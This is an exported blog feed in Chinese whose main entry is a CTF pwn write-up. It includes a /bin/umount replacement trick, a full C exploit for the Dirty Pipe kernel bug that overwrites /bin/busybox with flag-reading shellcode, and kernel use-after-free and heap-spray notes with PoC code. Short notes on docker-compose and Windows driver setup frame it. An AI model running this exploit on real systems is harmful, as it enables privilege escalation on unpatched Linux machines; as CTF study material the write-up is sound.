<h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>创建多个docker。</p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>TPCTF PWN</title>
    <url>/2024/01/22/TPCTF/</url>
    <content><![CDATA[<blockquote>
<p>TPCTF  PWN  safthttpd &amp; core </p>
</blockquote>
<span id="more"></span>

<p>比赛时就做了两题，safehttpd 除了密码可以爆出来，看不出来漏洞。<br>core 看了一眼bzImage kernel 5.8 就直接想到了 dirtypipe 那个CVE，没有看LKM</p>
<h2 id="safehttpd"><a href="#safehttpd" class="headerlink" title="safehttpd"></a>safehttpd</h2><blockquote>
<p>真的有问题吗</p>
</blockquote>
<p>需要知道一个CVE，<a href="https://sourceware.org/bugzilla/show_bug.cgi?id=30068">CVE-2023-25139</a></p>
<h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><blockquote>
<p>WOW，kernel 5.8 !</p>
</blockquote>
<h3 id="bin-权限"><a href="#bin-权限" class="headerlink" title="&#x2F;bin 权限"></a>&#x2F;bin 权限</h3><p>也算是比较常见的问题，bin目录权限属于 <code>ctf</code>，我们可以进行修改，因此修改 <code>/bin/umount</code> 程序就行，退出后会执行umount</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">rm</span> -f /bin/umount</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;cat /root/flag&quot;</span> &gt; /bin/umount</span><br><span class="line">$ <span class="built_in">chmod</span> 755 /bin/umount</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<h3 id="CVE-2022-0847"><a href="#CVE-2022-0847" class="headerlink" title="CVE-2022-0847"></a>CVE-2022-0847</h3><p>内核版本属于kernel 5.8，属于dirtypipe 漏洞范围内，可以修改任意可读文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.8.0 (vm@vm-pc)</span><br></pre></td></tr></table></figure>

<p>shellcode：Linux 下的 <code>I/O</code> 相关函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;./run.sh&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sendfile</span>(<span class="number">1</span>, fd, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; nasm -f elf64 shell.asm</span><br><span class="line">; ld -s shell.s</span><br><span class="line">;</span><br><span class="line">; use pwntools</span><br><span class="line">; open(&#x27;/root/flag&#x27;, 0) =&gt; shellcraft.open(&#x27;/root/flag&#x27;, 0)</span><br><span class="line">; I/O: 0拷贝</span><br><span class="line">; sendfile(int out_fd, int in_fd, off_t *offset, size_t count);</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">_start:</span><br><span class="line">	/* open(&#x27;/root/flag&#x27;, O_RDONLY=0) */</span><br><span class="line">	push 0x1016660</span><br><span class="line">	xor DWORD PTR [rsp], 0x1010101</span><br><span class="line">	mov rax, 0x6c662f746f6f722f</span><br><span class="line">	push rax</span><br><span class="line">	mov rdi, rsp</span><br><span class="line">	xor esi, esi</span><br><span class="line">	push 2</span><br><span class="line">	pop rax</span><br><span class="line">	syscall</span><br><span class="line">	/* sendfile(out_fd, in_fd, offset=0, count=0x40) */</span><br><span class="line">	push 0x40</span><br><span class="line">	pop r10</span><br><span class="line">	push 1</span><br><span class="line">	pop rdi</span><br><span class="line">	xor edx, edx</span><br><span class="line">	mov esi, eax</span><br><span class="line">	push 0x28</span><br><span class="line">	pop rax</span><br><span class="line">	syscall</span><br><span class="line">	/* exit(0) */</span><br><span class="line">	xor edi, edi</span><br><span class="line">    push 60</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此学习了一下如何生成比较小的ELF文件，写了一个<a href="https://github.com/Ha0-Y/ShellcodeToELF">简单的工具</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdnoreturn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> noreturn <span class="type">void</span> <span class="title">err</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Error %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x60</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x6f</span>, <span class="number">0x74</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x50</span>, <span class="number">0x6a</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xff</span>,</span><br><span class="line">    <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x7f</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x6a</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xEB</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">pipe</span>(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> pipe_size =</span><br><span class="line">      <span class="built_in">fcntl</span>(p[<span class="number">1</span>], F_GETPIPE_SZ); </span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="type">unsigned</span> n = r &gt; <span class="built_in">sizeof</span>(buffer) ? <span class="built_in">sizeof</span>(buffer) : r;</span><br><span class="line">    <span class="built_in">write</span>(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="type">unsigned</span> n = r &gt; <span class="built_in">sizeof</span>(buffer) ? <span class="built_in">sizeof</span>(buffer) : r;</span><br><span class="line">    <span class="built_in">read</span>(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] start exploit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] get page size&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> page_size = <span class="built_in">sysconf</span>(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] get and check args&quot;</span>);</span><br><span class="line">  <span class="type">__off64_t</span> offset = <span class="number">1</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> shellcode_len = <span class="built_in">sizeof</span>(shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/bin/busybox&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err</span>(<span class="string">&quot;[x] cannot open file&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">fstat</span>(fd, &amp;st)) &#123;</span><br><span class="line">    <span class="built_in">err</span>(<span class="string">&quot;[x] get stat error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (offset + shellcode_len &gt; st.st_size) &#123;</span><br><span class="line">    <span class="built_in">err</span>(<span class="string">&quot;[x] write error! large then original file size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] prepare pipe&quot;</span>);</span><br><span class="line">  <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">  <span class="built_in">prepare_pipe</span>(pipe_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] splice file&quot;</span>);</span><br><span class="line"></span><br><span class="line">  --offset;</span><br><span class="line">  <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(fd, &amp;offset, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err</span>(<span class="string">&quot;[x] splice error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] write content to target suid file&quot;</span>);</span><br><span class="line">  nbytes = <span class="built_in">write</span>(pipe_fd[<span class="number">1</span>], &amp;shellcode[<span class="number">1</span>], shellcode_len);</span><br><span class="line">  <span class="keyword">if</span> (nbytes &lt;= <span class="number">0</span> || nbytes &lt; shellcode_len) &#123;</span><br><span class="line">    <span class="built_in">err</span>(<span class="string">&quot;[x] write to file error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] finish exploit!!&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line">[*] start exploit</span><br><span class="line">[+] get page size</span><br><span class="line">[+] get and check args</span><br><span class="line">[+] prepare pipe</span><br><span class="line">[+] splice file</span><br><span class="line">[+] write content to target suid file</span><br><span class="line">[*] finish exploit!!</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">Segmentation fault</span><br><span class="line">/ $ <span class="built_in">exit</span></span><br><span class="line">flag&#123;123456&#125;</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<h3 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">heap[i]  内核堆，在堆首部存入我们输入数字</span><br><span class="line">heap[i+<span class="number">15</span>] 判断是否正在使用</span><br></pre></td></tr></table></figure>

<p>首先堆的大小：<code>kmalloc_caches[6]</code>0x40，也就是64。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk = <span class="built_in">kmem_cache_alloc</span>(kmalloc_caches[<span class="number">6</span>], <span class="number">3520LL</span>, <span class="number">0LL</span>, idx);</span><br></pre></td></tr></table></figure>

<p>add: 看作一个树，值比根节点大的放在根左边，小的放在右边</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">add</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nr; <span class="comment">// eax</span></span><br><span class="line">  __int64 _idx; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *_chunk; <span class="comment">// rdx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( add_count )</span><br><span class="line">  &#123;</span><br><span class="line">    nr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      _idx = nr;</span><br><span class="line">      _chunk = heap_var[nr];</span><br><span class="line">      <span class="keyword">if</span> ( !_chunk )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *_chunk &lt; idx )</span><br><span class="line">      &#123;</span><br><span class="line">        nr = <span class="number">2</span> * nr + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( nr &gt; <span class="number">0xF</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        nr = <span class="number">2</span> * nr + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( nr &gt; <span class="number">0xF</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chunk = <span class="built_in">kmem_cache_alloc</span>(kmalloc_caches[<span class="number">6</span>], <span class="number">3520LL</span>, <span class="number">0LL</span>, idx);<span class="comment">// 0x40</span></span><br><span class="line">    --add_count;</span><br><span class="line">    heap_var[_idx + <span class="number">15</span>] = <span class="number">1LL</span>;</span><br><span class="line">    heap_var[_idx] = chunk;</span><br><span class="line">    *chunk = idx;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printk</span>(&amp;unk_3EE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题出现在如下，可以等于0xf，从而导致 <code>heap[15]</code> 被覆盖。idx&#x3D;0 可以在free后edit。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *_chunk &lt; idx )</span><br><span class="line">&#123;</span><br><span class="line">	nr = <span class="number">2</span> * nr + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> ( nr &gt; <span class="number">0xF</span> )</span><br><span class="line">	  <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete，free后没有置空</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || !heap_var[idx] || !heap_var[idx + <span class="number">15</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">delete_cold</span>();</span><br><span class="line">  <span class="built_in">kfree</span>(heap_var[idx]);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  heap_var[idx + <span class="number">15</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit，判断 <code>heap_var[nr + 15]</code> 是否为0，进行edit。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">edit</span><span class="params">(<span class="type">unsigned</span> __int16 idx, __int64 buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nr; <span class="comment">// eax</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  nr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk = heap_var[nr];</span><br><span class="line">      <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *chunk &gt;= idx )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      nr = <span class="number">2</span> * nr + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nr &gt; <span class="number">0xF</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *chunk &lt;= idx )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    nr = <span class="number">2</span> * nr + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( nr &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !heap_var[nr + <span class="number">15</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">copy_from_user</span>(chunk, buf, <span class="number">48LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">edit_cold</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是 <code>*chunk &gt;= idx</code> 的比较需要我们可以控制堆的内容</p>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p><code>user_key_payload</code> 在调用 rcu 之前不会写入 header，也就是前16个字节不会改变(占据idx&#x3D;15，因此是很好的利用点。</p>
<ul>
<li>堆喷射 user_key_payload 和 pipe，使用 fcntl 修改 ring_size 大小，使其为 0x40 的slab</li>
<li>uaf 修改 <code>datalen</code> 从而可以越界读取内容。</li>
<li>free user_key_payloay<ul>
<li>堆喷射 <code>pipe</code>，UAF: 构建二级自写管道 或者 直接改 <code>flags</code> &#x3D;&gt; <code>dirty pipe</code></li>
</ul>
</li>
</ul>
<p>msg_msg 也是常用的一种方式，可以任意地址读写</p>
<ul>
<li>msg_msg 占位，主从消息，主消息0x40</li>
<li>UAF 修改 m_ts <code>0x1000 - msg_header</code> 进行越界读取，读取到后面的msg</li>
<li>通过其 next 指针进行任意地址读&#x2F;写</li>
<li>或者使用 CVE-2021-22555 的做法</li>
<li>但是需要猜测其最后两字节的数字</li>
</ul>
<p>PoC</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span>(<span class="number">0x400</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">new</span>(<span class="number">0x500</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">new</span>(<span class="number">0x600</span>); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">new</span>(<span class="number">0x700</span>); <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">new</span>(<span class="number">0x800</span>); <span class="comment">// 15</span></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">15</span>);</span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0x32</span>, <span class="built_in">sizeof</span>(data));</span><br><span class="line">key_id = <span class="built_in">key_alloc</span>(<span class="string">&quot;11111111&quot;</span>, data, <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span> (key_id &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">EMSG</span>(<span class="string">&quot;key_alloc error&quot;</span>);</span><br><span class="line"><span class="built_in">debug</span>(<span class="string">&quot;heap[15]&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>调试如下，两次free+key_alloc后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0xffff88800e65df80</span><br><span class="line">00:0000│  0xffff88800e65df80 ◂— 0x800</span><br><span class="line">01:0008│  0xffff88800e65df88 ◂— 0x0</span><br><span class="line">02:0010│  0xffff88800e65df90 ◂— 0x20 /* <span class="string">&#x27; &#x27;</span> */</span><br><span class="line">03:0018│  0xffff88800e65df98 ◂— <span class="string">&#x27;22222222222222222222222222222222&#x27;</span></span><br><span class="line">... ↓     3 skipped</span><br><span class="line">07:0038│  0xffff88800e65dfb8 ◂— 0x0</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/spray/#_2">Heap Spray - CTF Wiki (ctf-wiki.org)</a></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>WDM</title>
    <url>/2024/01/27/WDM/</url>
    <content><![CDATA[<blockquote>
<p>Window Driver Module</p>
</blockquote>
<span id="more"></span>
<h2 id="WDK"><a href="#WDK" class="headerlink" title="WDK"></a>WDK</h2><p>VS中没有找到单个组件的这些选项，因此使用官方的方法下载，单独下载sdk和wdk</p>
<ul>
<li><a href="https://blog.csdn.net/qq_44240304/article/details/127549383">window10+vs2022配置window驱动开发环境</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk">下载 Windows 驱动程序工具包 (WDK) - Windows drivers</a></li>
</ul>
<p>然后会有一个 <code>VSIX Installer</code>，下载好之后，我们的VS就可以开发了</p>
<p>新建项目，应该可以看到 <code>Driver</code> 选项</p>
<p>或者使用Windows提供的虚拟机 <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows VM</a></p>
<h2 id="驱动开发"><a href="#驱动开发" class="headerlink" title="驱动开发"></a>驱动开发</h2><p>windows驱动分两类，NT式驱动和WDM驱动，后者支持即插即用；</p>
<p>因此选择 <code>WDM(Windows Driver Model)</code>， 提供一个驱动入口 <code>DriverEntry</code> 和 驱动卸载 <code>DriverOnload</code> 函数。需要注意C++ 的名称粉碎机制</p>
<p>右键，属性，Driver Setting</p>
<ul>
<li>target OS 在VS2022 + win11 已经不能成功生成win7版本</li>
<li>target paltform:<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/develop/target-platforms">驱动程序参考页上的“目标平台”</a></li>
</ul>
